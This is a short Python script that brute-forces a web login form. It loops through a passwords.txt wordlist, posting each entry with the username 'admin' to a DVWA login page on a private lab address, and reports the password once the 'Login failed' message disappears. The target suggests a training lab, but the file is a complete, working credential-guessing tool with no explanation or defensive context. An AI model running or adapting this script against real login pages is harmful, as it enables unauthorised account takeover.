#/usr/bin/env python

import requests


# <form action:"login.php" method="post">
target_url = "http://192.168.140.129/dvwa/login.php"
# <input class="", name="username">, <name="password">, Button: <name="Login">
data_dict = {"username": "admin", "password": "", "Login":"submit"}

with open("passwords.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in str(response.content):
            print("[+] Got the password --> " + word)
            exit()

print("[+] Reached end of line, password not found.")